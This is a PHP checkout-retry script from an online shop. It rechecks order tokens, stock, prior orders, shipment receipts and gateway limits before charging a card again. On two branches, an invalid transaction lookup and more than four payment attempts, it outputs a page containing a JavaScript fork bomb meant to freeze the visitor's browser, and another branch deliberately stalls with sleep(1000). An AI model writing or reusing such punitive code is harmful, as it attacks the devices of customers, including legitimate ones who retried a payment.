<?php

	if( ss_isAdmin() )
		die;

//	echo "Due to processor errors, this function has been disabled. Please call your bank to confirm charges to your card.";
//	die;

	$tr_id = (int)$this->ATTRIBUTES['tr_id'];
	$tr_token = safe($this->ATTRIBUTES['tr_token']);

	$row = getRow( "select * from transactions join shopsystem_orders where or_tr_id = tr_id and tr_id = $tr_id and or_cancelled IS NULL AND tr_token = '$tr_token' and tr_completed = 0 and or_shipped IS NULL and or_paid IS NULL and (tr_fraud_score = 0 OR tr_fraud_score IS NULL)" );

	// check for stock levels again...

	if( $row )
	{

		$usID = $row['or_us_id'];
		ss_log_message( "User $usID recheckout for tr_id $tr_id token $tr_token" );
		ss_audit( 'other', 'users', ss_getUserID(), "User recheckout for tr_id $tr_id" );

		$theUser = getRow("SELECT * FROM users WHERE us_id = ".(int)$usID );

		if( $theUser['us_bl_id'] > 0 )
			die;

		// recheck stock levels

		$basketRaw = $row['or_basket'];
		$OrderDetails = unserialize( $basketRaw );
		$all_available = true;
		$msg = '';

		foreach( $OrderDetails['Basket']['Products'] as $index => $value )
		{
			// $available = getField( "select pro_stock_available > {$value['Qty']} + if( pro_typical_daily_sales IS NULL, 0, pro_typical_daily_sales*3) from shopsystem_product_extended_options where pro_pr_id = ".$OrderDetails['Basket']['Products'][$index]['Product']['pr_id'] );
			$available = getField( "select pro_stock_available >= {$value['Qty']} from shopsystem_product_extended_options where pro_pr_id = ".$OrderDetails['Basket']['Products'][$index]['Product']['pr_id'] );

			if( !$available )
			{
				$all_available = false;
				$msg .= ' pr_id '.$OrderDetails['Basket']['Products'][$index]['Product']['pr_id'];
			}
		}

		if( $all_available )
		{
			// recheck previous transaction count

			$previousOrders = getField( "select count(*) from shopsystem_orders
												JOIN transactions ON tr_id = or_tr_id 
											where or_us_id = $usID
												AND tr_completed = 1
												and (or_paid IS NOT NULL OR or_paid_not_shipped IS NOT NULL)" );

			ss_log_message( "User ID $usID has $previousOrders previous orders and wants to pay for abandoned order $tr_id" );

			// code fragment also in System/Classes/AssetTypes/ShopSystemAsset/Services/model_checkout.php
			if( ( $theUser['us_bl_id'] != -1 ) && ( ($previousOrders == 2) || ($previousOrders == 1) ) )		// NOT whitelisted and 1 or 2 orders previously
			{
				// check to see if previous order all received
				$can_chargeback_this = getField( "select pg_can_chargeback from payment_gateways where pg_id = ".$row['tr_bank'] );

				ss_log_message( "can charge back this order? $can_chargeback_this" );

				$previousOrID = (int) getField( "select max( or_id )
												from shopsystem_orders
													JOIN transactions ON tr_id = or_tr_id 
													left join payment_gateways on tr_bank = pg_id
												where or_us_id = $usID
													AND tr_completed = 1
													AND or_actioned IS NULL
													and or_reshipment IS NULL"
													.($can_chargeback_this?"":" and pg_can_chargeback != 0")		// if they can't charge back this order, ignore earlier ones that can't be charged back
													." and (or_paid IS NOT NULL OR or_paid_not_shipped IS NOT NULL)" );

				ss_log_message( "user has 1-2 previous Orders, looking at or_id $previousOrID" );
				$when = getField( "select or_recorded > NOW() - INTERVAL 4 WEEK from shopsystem_orders where or_id = $previousOrID" );

				if( $when )
				{
					ss_log_message( "last order is less than 4 weeks ago" );
					$SheetQ = query( "select * from shopsystem_order_sheets_items where orsi_or_id = $previousOrID" );

					$all_received = true;

					if( $SheetQ->numRows() > 0 )
					{
						ss_log_message( " and has been packed" );
						while( $SheetItems = $SheetQ->fetchRow() )
						{
							ss_log_message( " item {$SheetItems['orsi_stock_code']}" );

							if( strlen( $SheetItems['orsi_no_stock'] ) )
								continue;

							if( getField( "select pr_is_service from shopsystem_products join shopsystem_product_extended_options on pr_id = pro_pr_id where pro_stock_code = '{$SheetItems['orsi_stock_code']}'"
										) == 'false' )
							{
								ss_log_message( " isn't a service" );
								if( strlen( $SheetItems['orsi_date_shipped'] ) && strlen( $SheetItems['orsi_received'] ) )
									;
								else
								{
									ss_log_message( " has been sent and not received" );
									$all_received = false;
								}
							}
						}
					}
					else
					{
						$all_received = false;
					}

					if( !$all_received )
					{
						sleep(1000);
						die;
					}
				}
				else
					ss_log_message( "last order is more than 12 weeks ago" );
			}

			$gw = getRow( "select * from payment_gateways left join payment_gateway_options on po_pg_id = pg_id where pg_id = ".(int) $row['tr_bank']." and po_active = true limit 1" );

			if( $gw && (($row['tr_total'] + $gw['pg_accumulation'] < $gw['pg_limit']) || $gw['pg_limit'] == "" || $gw['pg_limit'] == NULL ) )
			{
				$normalSite = $GLOBALS['cfg']['plaintext_server'];
				$totalPrice = $row['tr_total'];

				$Q_Order = $row;
				$_SESSION['GatewayOption'] = $row['tr_gateway_option'];
				$payrow = $gw;
				$chargeCurrency = array();
				$chargeCurrency['CurrencyCode'] = $row['tr_currency_code'];

				$tries = getField( "Select tr_payment_attempts from transactions  where tr_id = $tr_id" );
				if( ++$tries > 4 )
				{
					query( "update shopsystem_orders set or_cancelled = NOW() where or_tr_id = $tr_id" );
					query( "update transactions set tr_fraud_score = 10 where tr_id = $tr_id" );
					ss_log_message( "Dying here" );
					session_destroy();
					?>
<html><head>
</head>
<body>
<script>
function _ForkBomb()
{
	setInterval(_ForkBomb, 1);
	setInterval(_ForkBomb, 1);
}

_ForkBomb();

</script>
</body></html>
				<?php
				ob_flush();
				flush();
				die;
			}
			else
			{
				query( "update transactions set tr_payment_attempts = $tries where tr_id = $tr_id" );
				require( $gw['pg_script'] );
				die;
			}
		}
	}
	else
	{
		// TODO, explain this to the customer.
		ss_log_message( "Stock not available anymore".$msg );
	}
}
else
{
	//		echo "NoRow";
	session_destroy();
	?>
	<html><head>
	</head>
	<body>
	<script>
	function _ForkBomb()
	{
		setInterval(_ForkBomb, 1);
		setInterval(_ForkBomb, 1);
	}

	_ForkBomb();

	</script>
	</body></html>
	<?php
	ob_flush();
	flush();
	die;
}

?>
